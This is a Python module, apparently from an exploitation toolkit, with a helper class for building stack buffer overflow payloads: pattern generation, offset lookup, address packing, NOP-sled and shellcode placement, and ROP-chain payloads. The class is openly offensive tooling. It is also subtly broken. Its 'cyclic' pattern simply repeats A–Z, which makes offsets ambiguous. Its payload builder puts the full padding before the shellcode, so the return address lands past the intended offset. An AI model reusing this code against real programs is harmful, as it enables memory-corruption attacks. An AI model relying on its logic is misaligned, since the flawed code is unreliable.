"""
Buffer Overflow Utilities Module

Provides utilities for buffer overflow exploitation.
"""

from typing import Optional, List
import struct


class BufferOverflowUtils:
    """
    Utilities for buffer overflow exploitation.
    
    Provides pattern generation, offset calculation, and payload construction.
    """
    
    def __init__(self, arch: str = 'x86_64', endian: str = 'little'):
        """
        Initialize buffer overflow utilities.
        
        Args:
            arch: Target architecture
            endian: Byte order ('little' or 'big')
        """
        self.arch = arch
        self.endian = endian
        self.word_size = 8 if arch == 'x86_64' else 4
    
    def generate_pattern(self, length: int) -> bytes:
        """
        Generate a cyclic pattern for offset calculation.
        
        Args:
            length: Pattern length
            
        Returns:
            Cyclic pattern bytes
        """
        # Simple cyclic pattern (A's, B's, C's, etc.)
        pattern = bytearray()
        cycle = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        
        for i in range(length):
            pattern.append(cycle[i % len(cycle)])
        
        return bytes(pattern)
    
    def find_offset(self, pattern: bytes, value: int) -> Optional[int]:
        """
        Find offset in pattern for a given value.
        
        Args:
            pattern: Cyclic pattern
            value: Value to find offset for
            
        Returns:
            Offset or None if not found
        """
        # Convert value to bytes based on word size
        if self.word_size == 8:
            value_bytes = value.to_bytes(8, byteorder=self.endian)
        else:
            value_bytes = value.to_bytes(4, byteorder=self.endian)
        
        # Search for value in pattern
        try:
            offset = pattern.index(value_bytes)
            return offset
        except ValueError:
            return None
    
    def create_payload(self, 
                       padding: int,
                       return_address: int,
                       nop_sled: int = 0,
                       shellcode: Optional[bytes] = None) -> bytes:
        """
        Create a buffer overflow payload.
        
        Args:
            padding: Padding size before return address
            return_address: Address to overwrite return address with
            nop_sled: Size of NOP sled
            shellcode: Optional shellcode to include
            
        Returns:
            Payload bytes
        """
        payload = bytearray()
        
        # Padding
        payload.extend(b'A' * padding)
        
        # NOP sled
        if nop_sled > 0:
            payload.extend(b'\x90' * nop_sled)  # NOP instruction
        
        # Shellcode
        if shellcode:
            payload.extend(shellcode)
        
        # Additional padding if needed to reach return address
        remaining = padding - len(payload)
        if remaining > 0:
            payload.extend(b'B' * remaining)
        
        # Return address
        if self.word_size == 8:
            payload.extend(return_address.to_bytes(8, byteorder=self.endian))
        else:
            payload.extend(return_address.to_bytes(4, byteorder=self.endian))
        
        return bytes(payload)
    
    def pack_address(self, address: int) -> bytes:
        """
        Pack an address based on architecture.
        
        Args:
            address: Address to pack
            
        Returns:
            Packed address bytes
        """
        if self.word_size == 8:
            return address.to_bytes(8, byteorder=self.endian)
        else:
            return address.to_bytes(4, byteorder=self.endian)
    
    def unpack_address(self, data: bytes) -> int:
        """
        Unpack an address from bytes.
        
        Args:
            data: Address bytes
            
        Returns:
            Unpacked address
        """
        if len(data) < self.word_size:
            raise ValueError(f"Data too short: {len(data)} < {self.word_size}")
        
        if self.word_size == 8:
            return int.from_bytes(data[:8], byteorder=self.endian)
        else:
            return int.from_bytes(data[:4], byteorder=self.endian)
    
    def calculate_canary_offset(self, canary_value: int, pattern: bytes) -> Optional[int]:
        """
        Calculate offset to canary in pattern.
        
        Args:
            canary_value: Canary value
            pattern: Pattern bytes
            
        Returns:
            Offset to canary or None
        """
        return self.find_offset(pattern, canary_value)
    
    def create_rop_payload(self,
                          padding: int,
                          rop_chain: bytes) -> bytes:
        """
        Create payload with ROP chain.
        
        Args:
            padding: Padding before ROP chain
            rop_chain: ROP chain bytes
            
        Returns:
            Complete payload
        """
        payload = bytearray()
        payload.extend(b'A' * padding)
        payload.extend(rop_chain)
        return bytes(payload)

